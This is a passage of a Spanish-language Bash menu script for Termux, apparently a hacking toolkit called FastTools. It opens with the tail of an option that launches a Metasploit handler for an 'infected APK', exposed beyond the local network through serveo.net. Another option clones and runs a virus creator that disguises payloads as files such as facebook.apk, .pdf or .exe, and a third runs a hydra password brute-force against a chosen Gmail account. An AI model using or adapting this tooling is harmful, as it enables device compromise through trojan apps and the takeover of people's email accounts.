			echo " NOTE: PARA HACER EL ATAQUE FUERA DE LA RED ' USA A serveo.net ' QUE ESTA EN UNA DE LAS OPCIONES DEL MENU, PERO USA LA MISMA CONFIG, AUN QUE DEBE QUEDAR COMO ESTE EJENPLO, EL PUERTO QUE USASTE PARA LA APK INFECTADA USALO DE PRIMERA OPCION EN ' CONFIG DEL HANDLER SERVIDOR ' Y DE SEGUNDO EL IP QUE INSERTASTE EN CONFIG HANDLER SERVIDOR Y EL TERCERO EL PUERTO QUE QUIERAS, ESE PUERTO UTILIZARA SERVEO PARA SU CONEXION, DEL 1024 ARRIBA, AHORA DE PUES ACTIVA A SERVEO CON LA MISMA CONFIG QUE EH DEJADO DE EJEMPLAR"
			echo
			sleep 5
			printf "$G PRESS $R ENTER TO $Y CONTINUE"
			read enter
			sleep 10
			cd $HOME
			sleep 2
			echo
			echo
			cd FastTools/.CONFIG;ls
			echo
			echo
			sleep 1
			printf "$G"
			read -p " INTRODUZCA EL NOMBRE DEL APK >> " CONFIG
			sleep 5
			echo $(clear)                  
			setterm -foreground white
			banner
			echo                                                             
			echo                                                              
			for o in  / - \ - \ - / - \ - / - \ - / - \ - / - \ -; do
				printf "$(clear)$Y [$G!$Y] $G ABRIENDO APK CONFIG. . . .$o"
				sleep 1                                                    
			
			done
			echo
			sleep 2
			msfconsole -r $CONFIG
			reiniciar
		;;
	14)
		cd $HOME
		echo $(clear)
		setterm -foreground white
		banner
		printf "$G"
		echo  " ::::::::: INICIANDO VIRUS CREATOR ::::::::::"
		echo
		sleep 10
		if [ -e ~/FastTools/.VIRS ]; then                                          
			printf "\n$Y [!]$Y VIRUS  . . .$G DONE!!!\n$W"
			sleep 5
		else                                                   
			printf "\n$R Oops!! $R FT required VIRUS , do u wanna install it $W"
                        echo
                        sleep 5
                        printf "$Y"

			echo
                        printf "$G DESEAS INSTALL VIRUS ?$G

$G 1) $C INSTALL VIRUS

$G 2) $R NO INSTALL AND EXIT$G"
                        echo
                        echo
                        read -p " Choose an Option >> " Z
			case $Z in
				1)
					echo
					printf "$G"                   
					echo " ::::::::INSTALANDO VIRUS CREATOR::::::::::::"
					echo                         
					rm -rf Malicious        
					sleep 2                
					echo                           
					git clone https://github.com/Hider5/Malicious.git && cd Malicious && chmod 777 malicious.py && pip2 install -r requirements.txt && cd $HOME && mv Malicious FastTools/.VIRS
					;;
				2)
					exit
			esac
		fi
		sleep 5                                                                   
		echo $(clear)                                       
		setterm -foreground red
		banner
		echo                                                                      
		printf "$M [$Y!$M] $G INICIANDO VIRUS CREATOR \n"                        
		sleep 5
		echo
		echo
		printf "$Y NOTE: SI TE INICIA CON CON ALGUNA FALLA, TE INVITO A LA OPCION 3) $G OK ENTER "
		read enter
		sleep 2
		cd $HOME
		sleep 1
		sleep 5                                                    
		cd FastTools/.VIRS                                                   
		echo
		sleep 2
		python2 malicious.py
		echo
		printf "$Y PRESIONE ENTER PARA CONTINUAR"
		read enter
		echo $(clear)                                                             
		printf "$G" 
		setterm -foreground red
		banner
		echo                                                                      
		echo                                                                      
		printf "$M [$Y!$M] $G RUTA PARA GUARDAR EL VIRUS APK Y WINDOWS\n"
		echo
		echo
		printf "$Y INSERTE LA CARPETA DE LA PLATAFORMA CREADA"
		echo
		cd $HOME
		sleep 5
		cd /data/data/com.termux/files/home/FastTools/.VIRS/;ls
		sleep 1
		echo
		printf "$G"                                                               
		read -p " INTRODUZCA EL NOMBRE DE LA PLATAFORMA DEL VIRUS >> " CARPETA
		echo
		sleep 5
		printf "$Y INTRODUCE EL ARCHIVO FORMATO Y CON SU FORMATO AL FINAL EJEMP ' facebook.apk o .pdf .exe  CON SU FORMATO Y NOMBRE COMPLETO DE LA PLATAFORMA QUE ELIJAS ETC O SIMPLEMENTE COPIA Y PEGA EL NOMBRE COMPLETO"
		echo
		echo
		printf "$G"
		sleep 5
		cd /data/data/com.termux/files/home/FastTools/.VIRS/$CARPETA;ls
		sleep 1
		echo
		printf "$G"
		read -p " INTRODUZCA EL NOMBRE DEL VIRUS >> " APKVIRUS
		echo
		sleep 2
		cd $HOME
		cd /data/data/com.termux/files/home/storage;ls
		echo
		printf "$G"
		sleep 1
		read -p " INTRODUZCA NOMBRE DE CARPETA A GUARDAR >> " STORAGE
		echo
		sleep 5
		mv /data/data/com.termux/files/home/FastTools/.VIRS/$CARPETA/$APKVIRUS /data/data/com.termux/files/home/storage/$STORAGE
		echo
		echo
		sleep 5
		printf "$Y"
		echo " GUARDADO CON EXITO EN LA RUTA $STORAGE"
		echo
		sleep 5
		cd $HOME
		if [ -e $PREFIX/storage/ ]; then
                printf "\n$Y [!]$G GUARDADO . . .$G EXITO!!!\n$W"
        else
                printf "\n$R [W]$Y GUARDADO . . . $G EXITO EN $STORAGE!!!\n$W"

        fi
	echo
	sleep 10
	cd $HOME                                                                          
	sleep 5   
	echo


		printf "$Y PRESIONA ENTER PARA VOLVER AL MENU PRINCIPAL"
		read enter
		reiniciar
		;;
		
	15)
		
		echo $(clear)
		setterm -foreground green
		banner
                echo
		printf "$Y"
                echo " INICIANDO FORCE BRUTE GMAIL "
		sleep 5
		sleep 5                                               
		if [ -e $PREFIX/bin/hydra ]; then                          
			printf "\n$Y [!]$Y HYDRA . . .$G DONE!!!\n$W"
			sleep 5
		else                                                                            printf "\n$R Oops!! $R FT required HYDRA , do u wanna install it $W"                                                 
			echo
                        sleep 5
                        printf "$Y"
                        echo                                   
			printf "$G DESEAS INSTALL HYDRA ?$G
	
$G 1) $C INSTALL HYDRA

$G 2) $R NO INSTALL AND EXIT$G"
                        echo
			echo
			read -p " Choose an Option >> " H
			case $H in
				1)
					echo
					printf "$G ::::::::::: INSTALLING HYDRA ::::::::::::::"
					sleep 5
					echo
					pkg install hydra
					;;
				2)
					exit
			esac
		fi
		setterm -foreground green
		banner
		echo
                printf "$M [$Y!$M] $G FORCE BRUTA GMAIL\n"
		echo
                echo
		printf "$G"
		sleep 5
		read -p " INTRODUCE EL GMAIL.com >> " gmail
		echo
		read -p " RUTA DEL WORDLIST/DICCIONARIO.txt >> " dic
		echo
		read -p " PUERTO PARA LA CONEXION >> " ups
		echo
		sleep 5
		echo $(clear)
                setterm -foreground red
		banner
                echo
                echo
                printf "$M [$Y!$M] $G INICIANDO EL ATAQUE AL $gmail \n"
                echo
		sleep 5
                echo
		printf "$G"
		hydra -S -l $gmail  -P $dic -e ns -V -s $ups smtp.gmail.com smtp
		echo
		printf " ENTER PARA VOLVER AL MENU"
		read enter
		reiniciar
		;;
	0)
		echo $(clear)
		setterm -foreground red
		banner
		setterm -foreground cyan
		echo
		echo
		echo "
Author  : LX
Code    : bash                                                          Version : 1.5 ( Beta )
		"
printf "$G please send message for errors to Luisencarnacion772@gmail.com or search in telegram https://t.me/Minattto"
echo
printf $Y'
1) MESSAGE GMAIL

2) MESSAGE TELEGRAM

3) VOLVER AL MENU PRINCIPAL
'
echo
read -p " Choose an Option >> " b
case $b in
	1)
		termux-open https://accounts.google.com/Logout?service=mail&continue=https://mail.google.com/mail&hl=es-419
		reiniciar
		;;
	2)
		termux-open https://t.me/Minattto
		reiniciar
		;;
	3)
		reiniciar
		;;
esac
;;

		
		00)
			echo $(exit)
			;;
	esac
